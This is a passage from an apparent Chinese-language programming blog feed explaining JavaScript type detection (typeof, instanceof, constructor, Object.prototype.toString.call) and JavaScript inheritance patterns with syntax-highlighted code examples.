class="keyword">typeof</span> say;   <span class="comment">// &quot;undefined&quot;（上下文没有定义）</span></span><br></pre></td></tr></table></figure><p>ECMAScript 提供的内置类型在计算机底层是按照二进制存储的</p><ul><li>1：数字 010：浮点数</li><li>100：字符串</li><li>-2^30：undefined</li><li>000000：null</li><li>000：对象</li></ul><p>JS 最初为了性能考虑使用低位存储变量信息，000 开头代表对象，然而 null 表示全 0，所以将它错误的判断为 object</p><h3 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h3><blockquote><p>底层原理：首先查找 <code>Symbol.hasInstance</code>，如果存在，基于这个检测。如果没有，则基于原型链<code>__proto__</code>查找，只要出现这个类的原型，结果就是 true</p></blockquote><p><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/dir(Function.prototype).jpg" alt="dir(Function.prototype)"></p><p>基于ES6 class 方式设置静态私有属性构建 <code>Symbol.hasInstance</code> 才会生效</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fn</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> [<span class="built_in">Symbol</span>.hasInstance]() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> f = <span class="keyword">new</span> Fn()</span><br><span class="line"><span class="built_in">console</span>.log(f <span class="keyword">instanceof</span> Fn) <span class="comment">// OK false</span></span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li>instanceof 不能正确判断基本数据类型</li><li>原型链可以重构，导致结果可能不准确</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[] <span class="keyword">instanceof</span> <span class="built_in">Array</span>      <span class="comment">// true</span></span><br><span class="line">[] <span class="keyword">instanceof</span> <span class="built_in">RegExp</span>     <span class="comment">// false</span></span><br><span class="line">[] <span class="keyword">instanceof</span> <span class="built_in">Object</span>     <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="literal">null</span> <span class="keyword">instanceof</span> <span class="built_in">Object</span>   <span class="comment">// false</span></span><br><span class="line"><span class="string">&quot;&quot;</span> <span class="keyword">instanceof</span> <span class="built_in">String</span>     <span class="comment">// false</span></span><br><span class="line"><span class="literal">true</span> <span class="keyword">instanceof</span> <span class="built_in">Boolean</span>  <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="number">123</span> <span class="keyword">instanceof</span> <span class="built_in">Number</span>;   <span class="comment">// false</span></span><br><span class="line">(<span class="number">1</span>).toFixed(<span class="number">2</span>)           <span class="comment">// &#x27;1.00&#x27; 浏览器有一个把1转换为对象格式1的操作 Object(1) 装箱</span></span><br></pre></td></tr></table></figure><h4 id="封装-instanceOf"><a href="#封装-instanceOf" class="headerlink" title="封装 instanceOf"></a>封装 instanceOf</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">instance_of</span>(<span class="params">obj, Ctor</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 数据格式准确性校验</span></span><br><span class="line">  <span class="keyword">if</span> (Ctor === <span class="literal">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">&quot;Right-hand side of &#x27;instanceof&#x27; is not callable&quot;</span>)</span><br><span class="line">  <span class="keyword">if</span> (!Ctor.prototype) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">&quot;Function has non-object prototype &#x27;undefined&#x27; in instanceof check&quot;</span>)</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> Ctor !== <span class="string">&#x27;function&#x27;</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">&quot;Right-hand side of &#x27;instanceof&#x27; is not callable&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 原始值类型直接忽略</span></span><br><span class="line">  <span class="keyword">if</span> (obj === <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^(object|function)$/</span>.test(<span class="keyword">typeof</span> obj)) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 先检测是否有Symbol.hasInstance这个属性</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> Ctor[<span class="built_in">Symbol</span>.hasInstance] === <span class="string">&#x27;function&#x27;</span>) <span class="keyword">return</span> Ctor[<span class="built_in">Symbol</span>.hasInstance](obj)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 最后才会按照原型链进行处理</span></span><br><span class="line">  <span class="keyword">let</span> prototype = <span class="built_in">Object</span>.getPrototypeOf(obj)</span><br><span class="line">  <span class="keyword">while</span> (prototype) &#123;</span><br><span class="line">    <span class="keyword">if</span> (prototype === Ctor.prototype) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    prototype = <span class="built_in">Object</span>.getPrototypeOf(prototype)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(instance_of([<span class="number">12</span>, <span class="number">23</span>], <span class="built_in">Array</span>)) <span class="comment">// true</span></span><br><span class="line"><span class="comment">// console.log(instance_of(null, null))</span></span><br><span class="line"><span class="comment">// console.log(instance_of(null, () =&gt; &#123;&#125;))</span></span><br><span class="line"><span class="comment">// console.log(instance_of(null, &#123;&#125;))</span></span><br></pre></td></tr></table></figure><h3 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h3><p>constructor 可以得知某个实例对象，到底是哪一个构造函数产生的</p><p><strong>注意：</strong>constructor 可以手动更改（如果手动更改原型指向，检测就不准确了）；如果修改了原型对象，一般也会同时修改 constructor。null 和 undefined 是无效的对象，所以不存在 constructor </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">true</span>.constructor === <span class="built_in">Boolean</span>; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = &#123;&#125;;</span><br><span class="line">a.constructor; <span class="comment">// Object()</span></span><br><span class="line">a.constructor = <span class="number">3</span>;</span><br><span class="line">a.constructor; <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><h3 id="Object-prototype-toString-call"><a href="#Object-prototype-toString-call" class="headerlink" title="Object.prototype.toString.call()"></a>Object.prototype.toString.call()</h3><blockquote><p>底层原理：除了 null/undefined，大部分数据类型所属类的原型上，都有toString方法；但是除了 <code>Object.prototype.toString</code> 用来检测数据类型，其余的都是转换为字符串的</p><ul><li>返回值：”[object ?]”<ul><li>先查找 [val] 的 <code>Symbol.toStringTag</code> （先找私有的，私有没有则向所属类原型上找），属性值就是”?”的值</li><li>没有，则内部是返回当前实例所属构造函数的名字 <code>“[object Number/String/Null/Undefined/Object/Array/Function/GeneratorFunction...]”</code></li></ul></li></ul></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> class2type = &#123;&#125;,</span><br><span class="line">  toString = class2type.toString</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.x = <span class="number">100</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Fn.prototype = &#123;</span><br><span class="line">  <span class="title">constructor</span>: <span class="title">Fn</span>,</span><br><span class="line">  <span class="title">getX</span>(<span class="params"></span>) &#123;&#125;,</span><br><span class="line">  [<span class="built_in">Symbol</span>.toStringTag]: <span class="string">&#x27;Fn&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> f = <span class="keyword">new</span> Fn()</span><br><span class="line"><span class="built_in">console</span>.log(toString.call(f)) <span class="comment">// &quot;[object Fn]&quot; 默认是&quot;[object Object]&quot;</span></span><br></pre></td></tr></table></figure><p>我们可以封装一个 isType 方法对类型进行判断</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> isType = <span class="function">(<span class="params">type, obj</span>) =&gt;</span></span><br><span class="line">    <span class="built_in">Object</span>.prototype.toString.call(obj) === <span class="string">`[object <span class="subst">$&#123;type&#125;</span>]`</span>;</span><br><span class="line"><span class="built_in">console</span>.log(isType(<span class="string">&quot;Number&quot;</span>, <span class="number">12</span>)); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>思考：每次都写 <code>Object.prototype.toString</code> 是否可以简写？</p><ul><li>如果调用 toString 方法，obj 首先会在自己私有方法里找，如果没有则顺着原型链往上找，所以 prototype 可以省略</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">obj.toString.call(<span class="literal">null</span>); <span class="comment">// &quot;[object Null]&quot;</span></span><br></pre></td></tr></table></figure><p>不过上面还是不够简洁，可否把 obj 直接省去？</p><ul><li>浏览器全局环境：window（是一个对象）</li><li>node全局环境：global（是一个对象）</li></ul><p>obj 省去的话，则默认是 window 调用 toString，我们来看一下 window 的原型链，最终指向 Object</p><p><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/window%E5%8E%9F%E5%9E%8B.jpg" alt="window原型"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">toString.call(<span class="literal">null</span>); <span class="comment">// 浏览器：&quot;[object Null]&quot;</span></span><br><span class="line">toString.call(<span class="literal">null</span>); <span class="comment">// node：[object Null]</span></span><br></pre></td></tr></table></figure><p>进一步验证一下，window 原型链上的 toString 是否和 Object.prototype 上的 toString 一致</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.toString === <span class="built_in">Object</span>.prototype.toString; <span class="comment">// 浏览器：true</span></span><br><span class="line"><span class="built_in">global</span>.toString === <span class="built_in">Object</span>.prototype.toString; <span class="comment">// node：true</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;JavaScript 有八种数据类型：&lt;/p&gt;
&lt;p&gt;基本数据类型：Boolean、Number、String、null、undefined、Symbol(ES6新增)、BigInt（ES2020引入）&lt;/p&gt;
&lt;p&gt;引用数据类型：Object&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Symbol：表示独一无二的值&lt;/p&gt;
&lt;p&gt;BigInt：用来解决 JavaScript 中数字只能到 53 个二进制位，大于这个范围的整数，无法精确表示&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="JavaScript" scheme="http://llmysnow.top/categories/JavaScript/"/>
    
    
    <category term="JavaScript" scheme="http://llmysnow.top/tags/JavaScript/"/>
    
    <category term="typeof" scheme="http://llmysnow.top/tags/typeof/"/>
    
    <category term="instanceof" scheme="http://llmysnow.top/tags/instanceof/"/>
    
    <category term="constructor" scheme="http://llmysnow.top/tags/constructor/"/>
    
    <category term="toString.call" scheme="http://llmysnow.top/tags/toString-call/"/>
    
  </entry>
  
  <entry>
    <title>JS 继承的四种方式</title>
    <link href="http://llmysnow.top/posts/3792d7db/"/>
    <id>http://llmysnow.top/posts/3792d7db/</id>
    <published>2021-08-31T02:16:08.890Z</published>
    <updated>2021-08-31T02:16:08.890Z</updated>
    
    <content type="html"><![CDATA[<h2 id="类三大特性"><a href="#类三大特性" class="headerlink" title="类三大特性"></a>类三大特性</h2><p>JS 本身是基于面向对象开发的编程语言。类：封装、继承、多态</p><ul><li><p>封装：类是一个函数，把实现一个功能的代码进行封装，以此实现 “低耦合高内聚”</p></li><li><p>多态：主要就是重载、重写两点</p><p>重写：子类重写父类上的方法（伴随着继承运行）</p><p>重载：相同的方法，由于参数或返回值不同，具备了不同的功能（JS 中不具备严格意义的重载；JS 中的重载，同一个方法内，根据传参不同实现不同的功能）</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数重载（两个函数名称相同，参数个数/类型不同）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">...rest: <span class="built_in">number</span>[]</span>): <span class="title">number</span></span></span><br><span class="line"><span class="function"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">...rest: <span class="built_in">string</span>[]</span>): <span class="title">string</span></span></span></span><br><span class="line"><span class="function"><span class="function"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">...rest: <span class="built_in">any</span>[]</span>): <span class="title">any</span> </span>&#123;</span></span></span><br><span class="line"><span class="function"><span class="function">  <span class="title">let</span> <span class="title">first</span> = <span class="title">rest</span>[0]</span></span></span><br><span class="line"><span class="function"><span class="function">  <span class="title">if</span> (<span class="params"><span class="keyword">typeof</span> first === <span class="string">&#x27;string&#x27;</span></span>) </span>&#123;</span></span><br><span class="line"><span class="function">    <span class="title">return</span> <span class="title">rest</span>.<span class="title">join</span>(<span class="params"><span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">  &#125;</span></span><br><span class="line"><span class="function">  <span class="title">if</span> (<span class="params"><span class="keyword">typeof</span> first === <span class="string">&#x27;number&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> rest.reduce(<span class="function">(<span class="params">pre, cur</span>) =&gt;</span> pre + cur)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>继承：子类继承父类的方法</p><p>其它语言的继承跟生活中的继承很相似，子基因修改了但不会影响父（单独拷贝一份）</p></li></ul><a id="more"></a><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>继承机制使得不同的实例可以共享构造函数的原型对象的属性和方法</p><p>以下情况都是 B 为子类，A 为父类</p><h3 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h3><blockquote><p>基本思想是利用原型让一个引用类型继承另一个引用类型的属性和方法。我们知道每个构造函数都有一个原型对象（<code>prototype</code>），原型对象都包含一个指向构造函数的指针（<code>constructor</code>），而实例都包含一个指向原型对象的内部指针（<code>__proto__</code>）</p><p>那么，如果让一个构造函数的原型对象等于另一个类型的实例，此时的原型对象将包含一个指向另一个原型的指针，相应地，另一个原型中也包含着一个指向另一个构造函数的指针</p></blockquote><p>原型继承：</p><ol><li>父类中私有和公有的属性方法，最后都变为子类实例公有的</li><li>和其它语言不同的是，原型链并不会把父类的属性方法，”拷贝”给子类，而是让子类实例基于 <code>__proto__</code> 原型链找到自己定义的属性和方法（”指向/查找”）</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.a = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">A.prototype.getA = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.a);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">B</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.b = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">B.prototype = <span class="keyword">new</span> A(); <span class="comment">// 让 B 类的原型指向 A 类的实例</span></span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> B();</span><br></pre></td></tr></table></figure><ul><li>让 B 类的原型（prototype）指向 A 类的实例，此时 B 类的原型是 A 类的实例（继承 A 类私有属性），同时 B 类的原型的 <code>__proto__</code> 指向 A 类的原型（继承 A 的公有属性）</li></ul><p><img data-src="https://gitee.com/lilyn/pic/raw/master/js-img/%E5%8E%9F%E5%9E%8B%E7%BB%A7%E6%89%BF.png" alt="原型继承"></p><p><strong>原型链继承的问题：</strong> 通过原型链继承后，B 的原型继承了 A 的实例属性变成了 B 的原型属性，若继承 A 的实例属性里面有引用数据类型，更改 B 的实例属性 colors，后续 B 的实例的实例属性 colors 都会被修改（并不是拷贝，而是指向）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.colors = [<span class="string">&quot;red&quot;</span>, <span class="string">&quot;green&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">B</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="comment">// new A()创建实例，实例拥有 colors 属性</span></span><br><span class="line"><span class="comment">// B 的原型改为该实例，则 B 的原型中添加 colors 属性</span></span><br><span class="line">B.prototype = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">let</span> arr1 = <span class="keyword">new</span> B();</span><br><span class="line">arr1.colors.push(<span class="string">&quot;yellow&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(arr1.colors); <span class="comment">// [ &#x27;red&#x27;, &#x27;green&#x27;, &#x27;yellow&#x27; ]</span></span><br><span class="line"><span class="keyword">let</span> arr2 = <span class="keyword">new</span> B();</span><br><span class="line"><span class="built_in">console</span>.log(arr2.colors); <span class="comment">// [ &#x27;red&#x27;, &#x27;green&#x27;, &#x27;yellow&#x27; ]</span></span><br></pre></td></tr></table></figure><p><strong>原型链继承的另一个问题：</strong> 在创建子类型的实例时，不能向父类型的构造函数中传递参数。所以实践中很少会单独使用原型链继承</p><p>应用：</p><ul><li>某些实例不属于某些类，但是想要用这个类原型上的方法，可以手动的去更改实例的 <code>__proto__</code> ，让它指向这个类的原型，这样这个实例就可以使用这个类的原型上的方法</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">arguments</span>.__proto__ = <span class="built_in">Array</span>.prototype;</span><br><span class="line">    <span class="comment">// arguments 是一个对象，对象上没有 sort 方法会报错</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">arguments</span>.sort(<span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a - b;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(fn(<span class="number">5</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">4</span>)); <span class="comment">// Array &#123; &#x27;0&#x27;: 3, &#x27;1&#x27;: 4, &#x27;2&#x27;: 5, &#x27;3&#x27;: 6 &#125;</span></span><br></pre></td></tr></table></figure><h3 id="借用构造函数（call-继承）"><a href="#借用构造函数（call-继承）" class="headerlink" title="借用构造函数（call 继承）"></a>借用构造函数（call 继承）</h3><blockquote><p>基本思想：在子类型构造函数的内部调用超类型构造函数，通过 apply() 和 call() 方法可以在新创建的对象上执行构造函数</p></blockquote><p>call 继承：</p><ul><li>只能继承父类中私有的，不能继承父类中公有的</li><li>B 类和 A 类，想要让 B 类的实例拥有 A 类的私有属性（但不拥有公有属性），我们可以让 A 当成普通函数执行，把里面的 this 指向改成 B 类的实例（往 B 的实例中添加属性）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.a = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="built_in">this</span>.x = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">B</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// this -&gt; 实例B</span></span><br><span class="line">    A.call(<span class="built_in">this</span>)</span><br><span class="line">    <span class="built_in">this</span>.b = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">    <span class="built_in">this</span>.y = <span class="number">200</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> B();</span><br></pre></td></tr></table></figure><p><strong>借用构造函数问题：</strong> 因为方法都是在构造函数中定义，因此就没有函数复用。而且，超类型的原型中定义的方法，对子类型来说是不可见的（只能添加私有属性）。实践中很少会单独使用借用构造函数</p><h3 id="寄生组合式继承"><a href="#寄生组合式继承" class="headerlink" title="寄生组合式继承"></a>寄生组合式继承</h3><blockquote><p>基本思想：借用原型链实现对原型属性和方法的继承，通过借用构造函数来实现实例属性的继承。这样既通过原型上定义方法实现了函数的复用，又保证每个实例都有自己的属性</p></blockquote><p>需求：B 类要继承 A 类的私有属性和公有属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.a = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="built_in">this</span>.x = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line">A.prototype.getA = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">B</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.b = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">    <span class="built_in">this</span>.y = <span class="number">200</span>;</span><br><span class="line">&#125;</span><br><span class="line">B.prototype.getB = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>我们很容易就能想到最简单的方法：A、B类的原型指向同一个堆内存地址。但修改时会相互影响，耦合性高，不推荐这么做</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">B.prototype = A.prototype;</span><br><span class="line">B.prototype.getB = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>解决方法：</strong></p><ol><li>我们可以先用借用 call 继承获取 A 类的私有属性</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">B</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    A.call(<span class="built_in">this</span>);</span><br><span class="line">    <span class="built_in">this</span>.b = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">    <span class="built_in">this</span>.y = <span class="number">200</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>再用原型链继承获取 A 类公有属性（需要写在 <code>B.prototype.getB</code>）</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.可以考虑用普通对象做中间件</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line">obj.__proto__ = A.prototype;</span><br><span class="line">B.prototype = obj;</span><br><span class="line">B.prototype.constructor = B;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.可以考虑用函数做中间件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">F.prototype = A.prototype;</span><br><span class="line">B.prototype = <span class="keyword">new</span> F();</span><br><span class="line">B.prototype.constructor = B;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.使用Object.create()方法</span></span><br><span class="line">B.prototype = <span class="built_in">Object</span>.create(A.prototype);</span><br><span class="line">B.prototype.constructor = B;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.借用实例</span></span><br><span class="line">B.prototype = <span class="keyword">new</span> A();</span><br><span class="line">B.prototype.constructor = B;</span><br></pre></td></tr></table></figure><ul><li>整理一下上述思路，合并一下代码</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.a = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="built_in">this</span>.x = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line">A.prototype.getA = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">B</span>(<span class="params"></span>) 